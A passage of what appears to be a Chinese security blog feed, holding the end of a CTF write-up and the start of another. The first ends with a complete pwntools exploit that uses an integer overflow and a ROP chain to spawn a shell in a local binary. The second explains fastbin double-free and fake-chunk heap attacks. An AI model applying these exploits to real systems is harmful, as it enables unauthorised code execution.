class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004003da</span>) <span class="comment"># syscall</span></span><br></pre></td></tr></table></figure></div><p>于是利用思路如下：</p><ol><li>输入构造的数字使read参数极大</li><li>填充到retn位置</li><li>填充rop利用链</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">p=process(<span class="string">'./intoverflow'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004017b7</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca080</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000480956</span>) <span class="comment"># pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line">payload += <span class="string">'/bin//sh'</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000047c601</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004017b7</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000042660f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000047c601</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401696</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca080</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004017b7</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000442e46</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000042660f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004003da</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Plz Input Your weight(kg):\n&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'4294967290'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Good! what\'s your name??\n&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;由寄存器位数差异引发的漏洞利用&quot;&gt;&lt;a href=&quot;#由寄存器位数差异引发的漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;由寄存器位数差异引发的漏洞利用&quot;&gt;&lt;/a&gt;由寄存器位数差异引发的漏洞利用&lt;/h1&gt;&lt;div</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Fastbin Attack</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Fastbin%20Attack/"/>
    <id>https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Fastbin%20Attack/</id>
    <published>2020-01-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:28:04.352Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Fastbin-Attack"><a href="#堆溢出-Fastbin-Attack" class="headerlink" title="堆溢出-Fastbin Attack"></a>堆溢出-Fastbin Attack</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用的前提是：</p><ul><li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li><li>漏洞发生于 fastbin 类型的 chunk 中</li></ul><p>fastbin使用单链表维护释放的堆块，由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    chunk3=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="comment">//进行释放</span></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">///////释放前</span></span><br><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== chunk1</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== chunk2</span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== chunk3</span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f41</span> &lt;=== top chunk</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">///////释放后</span></span><br><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== chunk1</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span> -----------------&gt;<span class="number">0x000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== chunk2</span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000602000</span>  <span class="number">0x0000000000000000</span> -----------------&gt;<span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== chunk3</span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000602040</span>  <span class="number">0x0000000000000000</span> -----------------&gt;<span class="number">0x602040</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f41</span> &lt;=== top chunk    </span><br><span class="line">    </span><br><span class="line"><span class="comment">/////////chunk 3、2、1 构成了一个单链表</span></span><br><span class="line">Fastbins[idx=<span class="number">2</span>, <span class="built_in">size</span>=<span class="number">0x30</span>,ptr=<span class="number">0x602080</span>]</span><br><span class="line">===&gt;Chunk(fd=<span class="number">0x602040</span>, <span class="built_in">size</span>=<span class="number">0x40</span>, flags=PREV_INUSE)</span><br><span class="line">===&gt;Chunk(fd=<span class="number">0x602000</span>, <span class="built_in">size</span>=<span class="number">0x40</span>, flags=PREV_INUSE)</span><br><span class="line">===&gt;Chunk(fd=<span class="number">0x000000</span>, <span class="built_in">size</span>=<span class="number">0x40</span>, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure></div><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><p>多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p><p>Fastbin Double Free 成功利用的条件：</p><ol><li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li><li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li></ol><p><strong>如果按顺序malloc了chunk0,chunk1，然后连续两次free(chunk0)则会被_int_free检测到从而导致“已放弃 (核心已转储)”，如果在 chunk0释放后，再释放 chunk1，这样 main_arena 就指向 chunk1 而不是 chunk0 了，此时再去释放 chunk0 就不再会被检测到。</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk0,*chunk1;</span><br><span class="line">    chunk0=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk0);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk0);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+------------+</span><br><span class="line">| fastbinY[i]|</span><br><span class="line">+-----+------+</span><br><span class="line">      |</span><br><span class="line">      v</span><br><span class="line">+-----+------+</span><br><span class="line">|   chunk0   +&lt;-----+</span><br><span class="line">+-----+------+      |</span><br><span class="line">      |             |</span><br><span class="line">      v             |</span><br><span class="line">+-----+------+      |</span><br><span class="line">|   chunk1   +------+</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 再进行一次 malloc() 分配到 chunk0，修改其 fd 指针</span><br><span class="line">&#x2F;&#x2F;伪造一个 fake chunk，</span><br><span class="line">&#x2F;&#x2F;往 chunk0 的数据段中写入 fake chunk 的地址，</span><br><span class="line">&#x2F;&#x2F;就可以将 chunk0 的 fd 指向 fake chunk，</span><br><span class="line">&#x2F;&#x2F;即将 fake chunk 添加进了 fastbin 链表中。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       +------------+</span><br><span class="line">+------+ fastbinY[i]|</span><br><span class="line">|      +------------+       +-------------+</span><br><span class="line">|                           |             |</span><br><span class="line">|            +-------------&gt;+  fake chunk |</span><br><span class="line">|            |              |             |</span><br><span class="line">|      +-----+------+       +-------------+</span><br><span class="line">|      |   chunk0   +&lt;-----+</span><br><span class="line">|      +------------+      |</span><br><span class="line">|                          |</span><br><span class="line">|      +------------+      |</span><br><span class="line">+-----&gt;+   chunk1   +------+</span><br><span class="line">       +------------+</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;再进行两次malloc()，</span><br><span class="line">&#x2F;&#x2F;依次分配到 chunk1 和 chunk0，</span><br><span class="line"></span><br><span class="line">   +------------+</span><br><span class="line">+------+ fastbinY[i]|</span><br><span class="line">|      +------------+       +-------------+</span><br><span class="line">|                           |             |</span><br><span class="line">|            +-------------&gt;+  fake chunk |</span><br><span class="line">|            |              |             |</span><br><span class="line">|      +-----+------+       